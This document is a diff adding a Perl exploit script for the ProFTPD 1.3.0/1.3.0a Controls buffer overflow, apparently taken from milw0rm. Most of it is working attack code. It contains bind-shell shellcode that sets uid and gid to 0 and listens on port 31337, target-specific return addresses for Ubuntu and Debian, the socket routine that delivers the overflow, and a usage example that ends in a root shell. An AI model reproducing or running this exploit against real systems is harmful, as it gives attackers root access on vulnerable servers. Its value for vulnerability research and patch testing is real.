@@ -1,0 +1,120 @@
+#!/usr/bin/perl -w
+ #
+ # $Id: revenge_proftpd_ctrls_26.pl, v1.1 2007/02/18 19:30:25 revenge Exp $
+ #
+ # ProFTPD v1.3.0/1.3.0a Controls Buffer Overflow Exploit
+ #
+ # Original Advisory :
+ #  http://www.coresecurity.com/?action=item&id=1594
+ #
+ # [ Exploitation condition ]
+ # - proftpd must be compiled with --enable-ctrls option
+ # - local user needs permission to connect through unix socket (from proftpd.conf)
+ #
+ # This one works for 2.6 exploitation against gcc 4.x
+ # Payload will bind /bin/sh on port 31337 with ( uid && gid = 0 )
+ # I was able to use only a <bind_shell> as payload since a normal (setuid + execve) seems that doesn't work
+ #
+ # Tested against:
+ # - ProFTPD 1.3.0/1.3.0a on Ubuntu 6.10 compiled with gcc 4.1.2
+ # - ProFTPD 1.3.0/1.3.0a on Debian Etch(4.0.2-5) compiled with gcc 4.0.3
+ # *** Against v1.3.0a -- server *could* remain up (in a Denial of Service condition) without binding shell
+ #
+ # revenge@eleusi~$ ./revenge_proftpd_ctrls.pl /usr/local/var/proftpd/proftpd.sock 1
+ # [ wait some secs then nc on port 31337 ]
+ # anyone@anywhere:~$ nc <host> 31337
+ # id
+ # uid=0(root) gid=0(root) groups=65534(nogroup)
+ # exit
+ # [ after that server will deactivate ]
+ #
+ #  See also : http://www.0xcafebabe.it/sploits/revenge_proftpd_ctrls_24.pl
+ #
+ # Alfredo "revenge" Pesoli
+ #
+ # http://www.0xcafebabe.it/
+ # <revenge@0xcafebabe.it>
+#
+
+use strict;
+use Socket;
+
+if ( @ARGV < 2 ) { &usage(); }
+
+my $hellcode =
+# *** Generated with libShellCode
+# setuid(0) + setgid(0) + bind(/bin/sh) on port 31337
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x31\xdb\xb0\x2e\xcd\x80".
+"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80".
+"\x89\xc7\x31\xc9\x66\xb9\x7a\x69\x52\x66\x51\x43\x66\x53\x89\xe1".
+"\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd".
+"\x80\x31\xc0\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3".
+"\x89\xd9\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\xeb\x18\x5e\x31\xc0\x88".
+"\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d".
+"\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+my $rsock   = shift;
+my $tn      = shift;
+
+my $ret;
+my $req;
+
+if ( $tn == '1' ) { $req = "A"x512; }
+else { $req = "A"x520; }
+
+use constant LSOCK  => '/tmp/tmp.sock';
+use constant CANARY => "\0\0\x0a\xff";
+use constant JUNK   => "AAAAaaaaAAAAaaaa";
+
+my %targets = (
+   '1' => "\x77\xe7\xff\xff",  # Ubuntu 6.10
+   '2' => "\x77\xe7\xff\xff"   # Debian Etch 4.0.2-5
+   # Add here your target RET
+);
+
+my %tname = (
+   '1' => "Ubuntu 6.10",
+   '2' => "Debian Etch 4.0.2-5"
+);
+
+$ret = $targets{$tn};
+
+my $buffer = $req.CANARY.JUNK.$ret.$hellcode;
+my $l = length($buffer);
+
+socket (SOCK, PF_UNIX, SOCK_STREAM, 0)  or die "Unable to create socket : $!";
+my $rfile = sockaddr_un($rsock);
+
+unlink LSOCK;
+my $lfile = sockaddr_un(LSOCK);
+
+bind (SOCK, $lfile) or die "Unable to bind to $lfile";
+chmod (00700, LSOCK);
+
+connect (SOCK, $rfile) or die "\nUnable to connect to ".$rsock."\nMaybe server is down or incorrect path\n\n";
+
+print "\n Buffer length => ".$l."\n";
+print " Target => ".$tname{$tn}."\n";
+
+send SOCK, pack("s2", 0),0;
+send SOCK, pack("s2", 1,0),0;
+send SOCK, pack("C", 188).pack("C",2).pack("s1",0),0;
+send SOCK, $buffer,0;
+
+close SOCK;
+
+print "\n [#] Request sent - try to connect on port 31337\n\n";
+
+sub usage() {
+   print "\n ProFTPD 1.3.0/1.3.0a Controls Buffer Overflow\n";
+   print " Alfredo \"revenge\" Pesoli\n";
+   print " <revenge\@0xcafebabe.it>\n\n";
+   print "Usage : $0 <path_to_unix_socket> <target>\n";
+   print "   Ex : $0 /usr/local/var/proftpd/proftpd.sock 1\n";
+   print "\n Available Targets :\n";
+   print "  1 => 0xffffe777 (Ubuntu 6.10 - EIP after 532 bytes)\n";
+   print "  2 => 0xffffe777 (Debian Etch 4.0.2-5 - EIP after 540 bytes)\n\n";
+   exit();
+}
+
+# milw0rm.com [2007-02-19]
